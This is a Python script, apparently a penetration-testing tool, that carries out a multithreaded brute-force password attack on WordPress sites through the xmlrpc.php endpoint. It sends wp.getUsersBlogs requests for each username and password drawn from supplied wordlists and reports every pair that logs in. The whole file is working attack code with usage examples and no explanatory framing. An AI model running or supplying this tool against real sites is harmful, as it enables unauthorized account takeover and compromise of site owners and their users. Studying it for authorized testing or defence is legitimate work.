#!/usr/bin/env python3

# Author: Bryan Muñoz (ret2x)

import argparse
from colorama import Fore
import os
from queue import Queue
import requests
import sys
import signal
import threading

check = "Incorrect"
print_lock = threading.Lock()
exit_event = threading.Event()
q = Queue()

GREEN = Fore.GREEN
GRAY = Fore.LIGHTBLACK_EX
RESET = Fore.RESET


def get_arguments():
    parser = argparse.ArgumentParser(description="XML-RPC Simple Brute Force Attack",
                                     formatter_class=argparse.RawTextHelpFormatter,
                                     epilog="Examples: \n"
                                     "XmlRpcbf.py -u http://www.wpsite.com -l admin -P passfile.txt\n"
                                     "XmlRpcbf.py -u http://www.wpsite.com -L userfile.txt -P passfile.txt")
    parser.add_argument("-u", "--url", dest="url",
                        metavar="url", help="target url (e.g. http://www.wpsite.com)")
    parser.add_argument("-l", dest="username",
                        metavar="USERNAME", help="username")
    parser.add_argument("-L", dest="userfile",
                        metavar="USERFILE", help="user_file.txt")
    parser.add_argument("-P", dest="passfile",
                        metavar="PASSFILE", help="pass_file.txt")
    parser.add_argument("-t", dest="threads", metavar="THREADS",
                        default=5, type=int, help="default 5")
    args = parser.parse_args()
    return args


def signal_handler(signum, frame):
    sys.exit()


signal.signal(signal.SIGINT, signal_handler)


def fancy_output(p1, p2):
    success = f"{GREEN}Success => {p1}:{p2}{RESET:50}"
    invalid = f"{GRAY}Invalid => {p1}:{p2}{RESET:50}"
    return success, invalid


def xml_data(user, pwd):
    xml = f'''
    <?xml version="1.0" encoding="iso-8859-1"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{user}</value></param>
    <param><value>{pwd}</value></param>
    </params>
    </methodCall>
    '''

    return xml


def do_request(url, xml):
    headers = {'content-type': 'application/xml'}
    try:
        r = requests.post(url + "/xmlrpc.php", data=xml, headers=headers)
    except requests.exceptions.ConnectionError as e:
        print("Connection Error", e)
        os._exit(1)
    finally:
        return r.text


def xml_brute_force(url, user):
    while True:
        pwd = q.get()

        if exit_event.is_set() is False:
            xml = xml_data(user, pwd)
            if check not in do_request(url, xml):
                with print_lock:
                    print(fancy_output(user, pwd)[0])
                    exit_event.set()
            else:
                with print_lock:
                    print(fancy_output(user, pwd)[1], end="\r")

        q.task_done()


def file_xml_brute_force(url, user_list):
    while True:
        pwd = q.get()

        for user in user_list[:]:
            xml = xml_data(user, pwd)
            if check not in do_request(url, xml):
                with print_lock:
                    print(fancy_output(user, pwd)[0])
                    user_list.remove(user)
            else:
                with print_lock:
                    print(fancy_output(user, pwd)[1], end="\r")

        q.task_done()


def main():
    args = get_arguments()
    url = args.url
    user = args.username
    user_file = args.userfile
    pass_file = args.passfile
    n_threads = args.threads

    if url and user and pass_file:
        with open(pass_file, "rb") as passwds:

            for pwd in passwds:
                pwd = pwd.strip().decode("latin-1")
                q.put(pwd)

            for t in range(n_threads):
                worker = threading.Thread(
                    target=xml_brute_force, args=(url, user,), daemon=True)
                worker.start()

            q.join()

    elif url and user_file and pass_file:
        with open(pass_file, "rb") as passwds:
            with open(user_file) as u:
                user_list = u.read().splitlines()

                for pwd in passwds:
                    pwd = pwd.strip().decode("latin-1")
                    q.put(pwd)

                for t in range(n_threads):
                    worker = threading.Thread(
                        target=file_xml_brute_force, args=(url, user_list,), daemon=True)
                    worker.start()

                q.join()

    else:
        sys.exit()


if __name__ == "__main__":
    main()
